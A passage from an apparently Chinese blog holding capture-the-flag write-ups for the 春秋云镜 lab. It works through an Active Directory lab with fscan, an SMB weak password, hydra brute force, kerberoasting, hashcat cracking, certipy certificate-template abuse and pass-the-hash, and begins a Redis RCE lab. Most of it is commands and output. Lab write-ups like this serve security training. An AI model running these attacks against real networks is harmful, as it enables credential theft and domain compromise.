[SUCCESS] 端口开放 172.22.9.26:135\n[2025-04-17 00:40:06] [SUCCESS] 服务识别 172.22.9.47:22 => [ssh] 版本:7.6p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7.]\n[2025-04-17 00:40:07] [SUCCESS] 服务识别 172.22.9.47:21 => [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]\n[2025-04-17 00:40:07] [SUCCESS] 服务识别 172.22.9.19:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-17 00:40:11] [SUCCESS] 服务识别 172.22.9.7:88 =>\n[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.19:80 => [http] 版本:1.18.0 产品:nginx 系统:Linux 信息:Ubuntu\n[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.26:445 =>\n[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:80 => [http]\n[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:445 =>\n[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:389 =>\n[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:139 =>  Banner:[.]\n[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.26:139 =>  Banner:[.]\n[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.47:80 => [http]\n[2025-04-17 00:41:07] [SUCCESS] 服务识别 172.22.9.47:445 =>\n[2025-04-17 00:41:07] [SUCCESS] 服务识别 172.22.9.47:139 =>\n[2025-04-17 00:41:12] [SUCCESS] 服务识别 172.22.9.7:135 =>\n[2025-04-17 00:41:12] [SUCCESS] 服务识别 172.22.9.26:135 =>\n[2025-04-17 00:41:12] [INFO] 存活端口数量: 16\n[2025-04-17 00:41:12] [INFO] 开始漏洞扫描\n[2025-04-17 00:41:12] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle\n[2025-04-17 00:41:12] [SUCCESS] 网站标题 http://172.22.9.19        状态码:200 长度:612    标题:Welcome to nginx!\n[2025-04-17 00:41:12] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.9.26\n主机名: DESKTOP-CBKTVMO\n发现的网络接口:\n   IPv4地址:\n      └─ 172.22.9.26\n[2025-04-17 00:41:12] [SUCCESS] 网站标题 http://172.22.9.47        状态码:200 长度:10918  标题:Apache2 Ubuntu Default Page: It works\n[2025-04-17 00:41:12] [SUCCESS] 网站标题 http://172.22.9.7         状态码:200 长度:703    标题:IIS Windows Server\n[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.7      DC:XIAORANG\\XIAORANG-DC\n[2025-04-17 00:41:12] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.9.7\n主机名: XIAORANG-DC\n发现的网络接口:\n   IPv4地址:\n      └─ 172.22.9.7\n[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393\n[2025-04-17 00:41:12] [SUCCESS] SMB认证成功 172.22.9.47:445 administrator:123456\n[2025-04-17 00:41:12] [INFO] 系统信息 172.22.9.47 [Windows 6.1]\n[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.47     fileserver                          Windows 6.1\n[2025-04-17 00:41:12] [INFO] SMB2共享信息 172.22.9.47:445 administrator Pass:123456 共享:[print$ fileshare IPC$]\n[2025-04-17 00:41:12] [SUCCESS] 目标: http://172.22.9.7:80\n  漏洞类型: poc-yaml-active-directory-certsrv-detect\n  漏洞名称:\n  详细信息:\n        author:AgeloVito\n        links:https://www.cnblogs.com/EasonJim/p/6859345.html\n~~~\n\n上来就扫到域控的漏洞了，但是现在还没有什么可用的信息没办法直接打。\n\n172.22.9.47:445 smb服务存在一个弱口令登陆一下看看\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# smbclient //172.22.9.47/fileshare -U administrator%123465\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Wed Jul 13 04:12:10 2022\n  ..                                  D        0  Wed Jul 13 00:35:09 2022\n  personnel.db                        A    61440  Wed Jul 13 03:46:55 2022\n  secret                              D        0  Wed Apr 16 11:57:06 2025\n  Certified_Pre-Owned.7z              N  9572925  Wed Jul 13 04:12:03 2022\n  Certified_Pre-Owned.pdf             N 10406101  Wed Jul 13 04:08:14 2022\n\n                41152812 blocks of size 1024. 36033208 blocks available\nsmb: \\> cd ..\nsmb: \\> ls\n  .                                   D        0  Wed Jul 13 04:12:10 2022\n  ..                                  D        0  Wed Jul 13 00:35:09 2022\n  personnel.db                        A    61440  Wed Jul 13 03:46:55 2022\n  secret                              D        0  Wed Apr 16 11:57:06 2025\n  Certified_Pre-Owned.7z              N  9572925  Wed Jul 13 04:12:03 2022\n  Certified_Pre-Owned.pdf             N 10406101  Wed Jul 13 04:08:14 2022\n\n                41152812 blocks of size 1024. 36033208 blocks available\nsmb: \\> cd secret\nsmb: \\secret\\> ls\n  .                                   D        0  Wed Apr 16 11:57:06 2025\n  ..                                  D        0  Wed Jul 13 04:12:10 2022\n  flag02.txt                          N      659  Wed Apr 16 11:57:06 2025\n\n                41152812 blocks of size 1024. 36033208 blocks available\n~~~\n\n找到flag02了\n\n# FLAG3&FLAG4\n\nflag02.txt里还给了一个提示\n\n~~~\nYes, you have enumerated smb. But do you know what an SPN is?\n~~~\n\n把所有文件都下载下来看一看,\n\n~~~\nsqlite> select * from xr_users ;\n1|admin|admin\n2|******|i9XDE02pLVf\n3|******|6N70jt2K9sV\n4|******|fiAzGwEMgTY\nsqlite> select * from xr_members ;\n1|huangmin|1|26|15220647319|huangmin@xiaorang.lab\n2|zhangrong|1|36|13073815024|zhangrong@xiaorang.lab\n3|liying|1|29|13126874319|liying@xiaorang.lab\n4|zhaoli|1|44|13075613024|zhaoli@xiaorang.lab\n5|zhangyan|0|35|15254139260|zhangyan@xiaorang.lab\n6|zhoujing|1|32|15123481906|zhoujing@xiaorang.lab\n7|liuying|1|24|13078310649|liuying@xiaorang.lab\n.......\n~~~\n\n personnel.db里面有用户和3个不知道用户名的密码，先将数据处理一下吧，将xr_users和xr_members的内容分别保存到pass和user里\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# cat pass|awk -F'|' '{print($3)}'>pass.txt\n\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# cat pass.txt\nadmin\ni9XDE02pLVf\n6N70jt2K9sV\nfiAzGwEMgTY\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# cat user|awk -F'|' '{print($2)}' >username.txt\n\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# cat username.txt\nhuangmin\nzhangrong\nliying\nzhaoli\nzhangyan\nzhoujing\nliuying\nwanghao\nwangqiang\nwanglu\nzhaoyong\nzhangli\nwangning\nwangyu\n...\n~~~\n\n用hydra爆破，可以爆破出来两个用户\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# hydra -L username.txt  -P pass.txt 172.22.9.26 smb\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-16 13:02:49\n[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 1 task per 1 server, overall 1 task, 1236 login tries (l:309/p:4), ~1236 tries per task\n[DATA] attacking smb://172.22.9.26:445/\n[445][smb] host: 172.22.9.26   login: zhangjian   password: i9XDE02pLVf\n[445][smb] host: 172.22.9.26   login: liupeng   password: fiAzGwEMgTY\n~~~\n\n然后进行Kerberoast攻击\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\nServicePrincipalName                   Name      MemberOf  PasswordLastSet             LastLogon  Delegation\n-------------------------------------  --------  --------  --------------------------  ---------  ----------\nTERMSERV/desktop-cbktvmo.xiaorang.lab  zhangxia            2023-07-14 00:45:45.213944  <never>\nWWW/desktop-cbktvmo.xiaorang.lab/IIS   zhangxia            2023-07-14 00:45:45.213944  <never>\nTERMSERV/win2016.xiaorang.lab          chenchen            2023-07-14 00:45:39.767035  <never>\n\n\n\n[-] CCache file is not found. Skipping...\n$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$d0a75403c0fd68eb28e523ec82bbcc13$5d435dfada83bc3decd547576a2e0e533633be1ba2ca116bf3944fce42987d3a695c18247303f24a3f5b295919ed0bd0a682c106b81a1e733cf5b27d8816b85b5506c6cd1c04a7eefb3a12f46c00f1483854c51afb647d8fd064e86bc839305531c7a2cd3639f0b79fe070b1c3d10135ee7fc258f1abecec4bcad5d82c3b6a1031235a312c34e669df79ad94ed4a5ddd19f8919e26d5cbe49108176f7a1f52b21a438be962732cd3c7dfbd709b3ee3b7f0ffd4f8817aef4da2ebd5f2339538a6ee44a6e455a0d0ef760238d871f2a01d742aadf0a6dab09e4dac1b37fa317ef49f0bc9ed332df6a15eceabb304cae0d04df2e349ea41f193c8c41c9bbc8876db2cb6edf7ea19dffcbaa75b2e8cc062d873b7697397ae963d8454d867983429b9a24371a2b7b2ded8bb30454fc5c0c92346d0a00f706a04a3fab6a4dd59760f53107727237a316546634868fc926f582409cad4b4ab5674ef0994c60a1256b9677b9069818967813c3cd508a71e6e10fef1ddcbec756bb24cd1ed1d47ba09bed8d199398bf40cb19ecb0298342ca5eb67091f99a66c1cf2b62cb2fea208df89e75245d570e3e6617889d2c3f65be9c64747c21b2cdae4d1f9b06bdd921c46668c433952d0297d575e04e053e33f6251407793efc6e781406a2342a82d4a1939538883c6dff90f8c7845e140332b37efc66cb4d38f7ad7a4d3c66ef6c2d20b56e8de9a5db8db344e18a72a86f7b0447752356e35f6bc97cf328221921735aa58772dc5b800db10ccd461c95783887ad9a065b7b360365b03e5966f9886fd4b5db3472db78c2a7f514f767984e2944a89912e7d4d0bc8c56e7043b9f4bcebe6ea9d1fe4a6715630f1362b2ae5bf62f25c45d3a9fe2ac85e61728c57d1940f21ed763c403d21794e80bace45f553be48d3d367616d735dfc517573d75a418518e90f28c621b3fc614c1e89a7a7a07056a6a849587666ea91dd6b649d7f73356b8c4807f453b0d3209a52f3b99f81012a76dd0ff159d968dd15ad4c7c035792cd1d56f7c537418a3b466b0f6fa2038b159999f2620b20e14f452d3dee9052fac011c78eb3bff235ea41f85aa82e56c8fca3c626a18255f47c40e3e20ddf3c34083f99e9005b61efaa61f939786a024a86e5f56ee1920a452f7f74a66f8ddbfac75eebfd468bc99b2266d2638d7fbf9dae6ba76b36f97cb452eee2bc129553b5c7725b1dc5a6f91a0d67e9cfb3079024ac0c7379a8b1f6eb76223d021233bf75b8279d7d4b01211dbd4b3baaa1c566b945fd757cbe0e8eee3f7ca8df0e2133848109d16df8fddf6b2e62922c9eca4c980cc6949ed145a146b7d1e2ca5fed6c1b378f4963afb15e8c02120467c33f3b30dec45c39da63c7f847513ea72614af712ccb867c6fb31fc135f9690d543a34f6bba84114d71915c021e9a8ade8a50a96c311940bd680e314f4bc8c5a90376b5a313000d497372e4278713368219da610794a1fe1ff560f6c36f4b31e70b63a06c8\n$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$756eb4d4a5fe99658d9e4329a03d65a5$7ac1c23cb3d99bb83a38e222924cacfb56f615a4f9b9024b7c8e0879221f744b82ca58662adb97a7a3aa3f7cc6a0095f1b3e8f1cbb2e89433341f2399b12841eba64593a74ce3d6ea849ed9dbb5bda3918470942af00817782299bcb2c44c5b9723aaecf746cf760466f47fdfe5aecf6586e249f0bf305d437747b27e29d2a78d78a897fdb0cfe05a903d35e8e8c31f74091fa6b0886ca297c5ae56b656a67f0dee88e9bcfc8f720f172bfcb8df630ad566a2118f7b862f460fb9a28afee2f3e92069bc8bd3862d0812e3fca7991d851238ca3872cb190d091e3cca90adf4da38d364bc759831d0e61fd2a17864389989b4b1dd49d6ddabc60619d6788947bea7ac1a6040e201e362cbefbff3adb78434a80c66511ef8860493dc94dea833b94bf9b6477a986485e4ee3ab05c91d1ab6ffb8679247bcbfea6c2b51fc15a4ce37ce815e2a7a6185ee09f3bcb05e0c3d31b65d642c3a8cf7546125d03260500675da2efe3c15c234a2bc9f5139a3612d521ad0e8315b3bcde7c3f628c723222c20d19937c8a3497ca4763326686a54c619c2d730e03a6a3247615f4ebde209c7a1e87c1c351fdbf16afb6268755646e14dd2f0ee14a977c4bf1ad0231fc7e4a33ec018e790b5a8d103c9a2ba9f8f0877929c54eda6ffcd936658f2e876273ba5eeef5066ea031c1176bbf365a88e8627f4143173155e5a93920e5722d93054ab1d3596fab388acca607372a94f427a2b7555d6d7e2a0fde397de943b9c34b9d2f9f552dea129a2e1120137ff2a2894e4f19725ad4b282c5be4fe370f428ab9ee0b7bcb30d5ab0a334726edd459ce838630ef6905f6a91640ea3096ca2ebe18691f956c7d017c437aa6219ba880d9948daf8738f30af06b5c6038763dbe9e4b6abf29cdb5ebd742fdf7b334817a29f4a927ce294db573acfb69a7b9b3d4b34e758d0ee3901633c13b15365b3aa50db5cd66ac1a83ed3230dcd3396510eed1554ef6dddd485ae97d4b2385a60833a104672a55b3740a8b57c1f9dfe167fe1e16c6f2c4446c3297ef067441a5a536db4697f979e246cb3abb5aa46a41cc140ccf89b23b503e5975f2cd845e4822a0b1d7b240d6c63e225278745e97c2e32ce7ca1efb2d911c4076911b78fe26adaf5d2289b5e0e76cb0ff50e20e61a8ff76cd0ea14275cb64cb34c219c7a9b4cea7fa0255848fecefa0849a32ffa14f3491e7f83ad092506f123b16df02eb00090e12b2bb5b60291ef8a9d57d6d3fd8505ddf799fa0a56e6309b03f372002090da40e7419e75629c0b518ac4d011b709fcf7866c1a581b7e0a5ac0ae28af906d7b95334c1098eeb3ec94a4e3623b72f60a53182d6f02d60790642400e687954328e1224c473bf010f3c73fd3184269f4cf3d9cb91178a962cb085f3dd45abb794437fbb348904fb12440e7c6ed237d97422ddbde2b0ef6c912a4c4ff86b4153a266f103dd9d69b8806d44e57f0271fa6db4b6b02021a0bdd55ee38323fc9f8d7bbb0a8b\n~~~\n\n可以拿到两个用户的hash，用hashcat爆破\n\n~~~~\nhashcat  hash /usr/share/wordlists/rockyou.txt\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# hashcat  hash --show\nHash-mode was not specified with -m. Attempting to auto-detect hash mode.\nThe following mode was auto-detected as the only one matching your input hash:\n\n13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol\n\nNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!\nDo NOT report auto-detect issues unless you are certain of the hash type.\n\n$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$2fef93477c96377b81b856c0a918b0f8$7b12ec73692a807cdb959eaeabd253a016b9a6617e9e882016aeba5e5c1f28e4e1d9bb1ce3cfedba110b3c628726b1b50585672544354fae17ec956eff2e27c39494cf3a08d7ab530114273c7d2332866c1483791d6a32b0fea66422abd61412b64b6bd672e30cf844a1da47c8c1cf6791e00abadb34423301ead5ba16fd13631a7a2e29bafaaa9d55a6f9063ef06838953339018d2a077e7c4db47fec5c341c2c53562bf772bd047f5035aade21b9c0c2ad8dc1eec04aa2a1f9e120c6f1508b734895b0ac1cf384ee3b01ffc723b963826221c291f0fbedf92c8f42d549c611b547d1a5bd2cb93c149b8fb01ecc0d785ca8615d49f2d77015c4431d3a122d723936f57e7abb137ce18d22ced5690de6fc3daa6c45f81f97a4427a8c9adb6665eb3ed0010961f38a8860aaaba72a49b67ec435f7ada78ccab514b6c4e465bf0a9b3c14f3e62f580b79d811d2814e3c952dd9a7cacf451632035e1f819a0289913b6f536d317a920b025da509fec7ad356b4d62d892080a87274e2cda87823971f719275afa7b00615cb43e00c586dc09d2f48d909944d352ef0f1b96b74e924c33b4d7a71618c6aaeea94c7b1b61fdc3cbda2b3a0074942a982e7c63258b58ffc74ca532760ad3da4d1b3f5275330457877de4d840477b03c1dbef4ab68bfbfc0400bb63082c9fdc3ca13cc89a8b91846e06d69a8d713aa7e184cc7ed888df935d42580969a9bb00fd61887bd7c55eca669e14ef8705fcb9d5515218c991935c5b37973b363ba58453543a7033e1869d6e1f4304c1887274b04bbe3bea1a24556698ba5fb21218100cfbd73fc5d09e424786f6e64b39e36c7d86b751c502d9f101a368e575c0be0fe4660db85b5d8c13af3c06c870bf3db18e9e7056256d29b153fc6724f6778c8502b763178a34d1fcd67c172d9a943f0a55b972b0d68f0d9507cfbd8acac33d5b340c6db1728a6ff79537e91c9fde40764b79448cf5f122080d770a860baf50a76a08076ac52de4d671cc8bd84f79bda7c0a52988b62a2954f7fe274ab0ad008cdbf8c3710d7d9cd263d9479c3309de5fec18ce56758e056dcfd942500adea9a14da3555e29e9277f8ca07af73299f70472137f7cd045b60f639f14b3bcfcf635c4ec0c0359c4d7238121af36fa7fb29316d4a45890c0973e432fb2b617256cfeec85c8496c506e79c31e4507eaf5ecc7d67540eed5fec810cdcf6d1682156597450c27b27ad617fdf0fd03abe04d181e58cec2af1edc85e243102c8db404aaaca939c42a54d633585eb7e26348ff26951c5cc8c6271d227520fdea38033174b4efddf6a589688223b263e8808fdbc85bbe20ea471fb529216d802776dcc3a7ef68334059213d49640da993c067719c0b119f9c3914295dedefcbd89f0facf3ba3700227de362e49f88302bf87e4cfc5787b364951e3301efa5ff817f5dbf372536ec3aa4:@Passw0rd@\n~~~~\n\n然后用`chenchen@xiaorang.lab:@Passw0rd@`进行远程桌面登录,用bloodhound进行信息搜集（其实也不用，因为之前fscan已经扫到洞了）\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# bloodhound-python -u chenchen -p @Passw0rd@ -d xiaorang.lab  -c all --dns-tcp -ns 172.22.9.7 --auth-method ntlm --zip\nINFO: Found AD domain: xiaorang.lab\nINFO: Connecting to LDAP server: xiaorang-dc.xiaorang.lab\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 2 computers\nINFO: Connecting to LDAP server: xiaorang-dc.xiaorang.lab\nINFO: Found 95 users\nINFO: Found 52 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DESKTOP-CBKTVMO.xiaorang.lab\nINFO: Querying computer: XIAORANG-DC.xiaorang.lab\nINFO: Done in 00M 06S\nINFO: Compressing output into 20250416132802_bloodhound.zip\n\n~~~\n\n上传Certify.exe查找易受攻击的证书\n\n~~~\n\nC:\\Users\\chenchen\\Desktop\\新建文件夹>Certify.exe find /vulnerable\n\n   _____          _   _  __\n  / ____|        | | (_)/ _|\n | |     ___ _ __| |_ _| |_ _   _\n | |    / _ \\ '__| __| |  _| | | |\n | |___|  __/ |  | |_| | | | |_| |\n  \\_____\\___|_|   \\__|_|_|  \\__, |\n                             __/ |\n                            |___./\n  v1.0.0\n\n[*] Action: Find certificate templates\n[*] Using the search base 'CN=Configuration,DC=xiaorang,DC=lab'\n\n[*] Listing info about the Enterprise CA 'xiaorang-XIAORANG-DC-CA'\n\n    Enterprise CA Name            : xiaorang-XIAORANG-DC-CA\n    DNS Hostname                  : XIAORANG-DC.xiaorang.lab\n    FullName                      : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CA\n    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED\n    Cert SubjectName              : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab\n    Cert Thumbprint               : 37BFD9FE73CA81E18E7A87CEBD90AF267E57170E\n    Cert Serial                   : 43A73F4A37050EAA4E29C0D95BC84BB5\n    Cert Start Date               : 2023/7/14 12:33:21\n    Cert End Date                 : 2028/7/14 12:43:21\n    Cert Chain                    : CN=xiaorang-XIAORANG-DC-CA,DC=xiaorang,DC=lab\n    UserSpecifiedSAN              : Disabled\n    CA Permissions                :\n      Owner: BUILTIN\\Administrators        S-1-5-32-544\n\n      Access Rights                                     Principal\n\n      Allow  Enroll                                     NT AUTHORITY\\Authenticated UsersS-1-5-11\n      Allow  ManageCA, ManageCertificates               BUILTIN\\Administrators        S-1-5-32-544\n      Allow  ManageCA, ManageCertificates               XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512\n      Allow  ManageCA, ManageCertificates               XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519\n    Enrollment Agent Restrictions : None\n\n[!] Vulnerable Certificates Templates :\n\n    CA Name                               : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CA\n    Template Name                         : XR Manager\n    Schema Version                        : 2\n    Validity Period                       : 1 year\n    Renewal Period                        : 6 weeks\n    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT\n    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS\n    Authorized Signatures Required        : 0\n    pkiextendedkeyusage                   : 安全电子邮件, 加密文件系统, 客户端身份验证\n    mspki-certificate-application-policy  : 安全电子邮件, 加密文件系统, 客户端身份验证\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights           : NT AUTHORITY\\Authenticated UsersS-1-5-11\n                                      XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512\n                                      XIAORANG\\Domain Users         S-1-5-21-990187620-235975882-534697781-513\n                                      XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519\n      Object Control Permissions\n        Owner                       : XIAORANG\\Administrator        S-1-5-21-990187620-235975882-534697781-500\n        WriteOwner Principals       : XIAORANG\\Administrator        S-1-5-21-990187620-235975882-534697781-500\n                                      XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512\n                                      XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519\n        WriteDacl Principals        : XIAORANG\\Administrator        S-1-5-21-990187620-235975882-534697781-500\n                                      XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512\n                                      XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519\n        WriteProperty Principals    : XIAORANG\\Administrator        S-1-5-21-990187620-235975882-534697781-500\n                                      XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512\n                                      XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519\n\n\n\nCertify completed in 00:00:10.1629693\n~~~\n\n~~~\n    CA Name                               : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CA\n    Template Name                         : XR Manage\n~~~\n\n这个可以打\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# certipy-ad req -u 'liupeng@xiaorang.lab' -p 'fiAzGwEMgTY' -target 172.22.9.7 -dc-ip 172.22.9.7 -ca \"xiaorang-XIAORANG-DC-CA\" -t\nemplate 'XR Manager'  -upn administrator@xiaorang.lab\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 7\n[*] Got certificate with UPN 'administrator@xiaorang.lab'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator.pfx'\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@xiaorang.lab\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@xiaorang.lab': aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80\n~~~\n\n得到了administrator的哈希了，拿下域控了，直接登录这台主机和域控拿flag即可\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-wmiexec  -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-wmiexec  --hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 administrator@172.22.9.26\n~~~\n\n","tags":["靶机"],"categories":["春秋云镜"]},{"title":"春秋云镜-Brute4Road","url":"/2025/04/15/春秋云镜-Brute4Road/","content":"\n\n\n\n\n# FLAG1&FLAG2\n\n先用fscan扫一下\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# ../pentest/fscan/fscan2 -h 39.99.231.184\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-04-15 02:37:33] [INFO] 暴力破解线程数: 1\n[2025-04-15 02:37:33] [INFO] 开始信息扫描\n[2025-04-15 02:37:33] [INFO] 最终有效主机数量: 1\n[2025-04-15 02:37:33] [INFO] 开始主机扫描\n[2025-04-15 02:37:33] [INFO] 有效端口数量: 233\n[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:6379\n[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:80\n[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:21\n[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:22\n[2025-04-15 02:37:33] [SUCCESS] 服务识别 39.99.231.184:21 => [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]\n[2025-04-15 02:37:34] [SUCCESS] 服务识别 39.99.231.184:22 => [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]\n[2025-04-15 02:37:38] [SUCCESS] 服务识别 39.99.231.184:6379 => [redis] 版本:5.0.12 产品:Redis key-value store\n[2025-04-15 02:37:39] [SUCCESS] 服务识别 39.99.231.184:80 => [http] 版本:1.20.1 产品:nginx\n[2025-04-15 02:37:43] [INFO] 存活端口数量: 4\n[2025-04-15 02:37:43] [INFO] 开始漏洞扫描\n[2025-04-15 02:37:43] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle\n[2025-04-15 02:37:43] [SUCCESS] 网站标题 http://39.99.231.184      状态码:200 长度:4833   标题:Welcome to CentOS\n[2025-04-15 02:37:44] [SUCCESS] 匿名登录成功!\n[2025-04-15 02:37:46] [SUCCESS] Redis 39.99.231.184:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb\n[2025-04-15 02:37:50] [SUCCESS] Redis无密码连接成功: 39.99.231.184:6379\n[2025-04-15 02:37:53] [SUCCESS] 扫描已完成: 5/5\n~~~\n\n打redis主从复制rce，flag在/home/redis/flag下，但是没有权限读，base64具有suid权限，可以用base64读取\n\n~~~\n/usr/bin/base64 ./flag01|/usr/bin/base64 -d\n~~~\n\nftp服务只有一个pub文件夹，没什么用，上传fscan扫描一下内网\n\n~~~\n./fscan -h 172.22.2.7/24\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-04-15 15:22:58] [INFO] 暴力破解线程数: 1\n[2025-04-15 15:22:58] [INFO] 开始信息扫描\n[2025-04-15 15:22:58] [INFO] CIDR范围: 172.22.2.0-172.22.2.255\n[2025-04-15 15:22:58] [INFO] 生成IP范围: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING)\n[2025-04-15 15:22:58] [INFO] 解析CIDR 172.22.2.7/24 -> IP范围 172.22.2.0-172.22.2.255\n[2025-04-15 15:22:58] [INFO] 最终有效主机数量: 256\n[2025-04-15 15:22:58] [INFO] 开始主机扫描\n[2025-04-15 15:22:58] [INFO] 正在尝试无监听ICMP探测...\n[2025-04-15 15:22:58] [INFO] 当前用户权限不足,无法发送ICMP包\n[2025-04-15 15:22:58] [INFO] 切换为PING方式探测...\n[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.3      存活 (ICMP)\n[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.7      存活 (ICMP)\n[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.16     存活 (ICMP)\n[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.18     存活 (ICMP)\n[2025-04-15 15:22:59] [SUCCESS] 目标 172.22.2.34     存活 (ICMP)\n[2025-04-15 15:23:04] [INFO] 存活主机数量: 5\n[2025-04-15 15:23:04] [INFO] 有效端口数量: 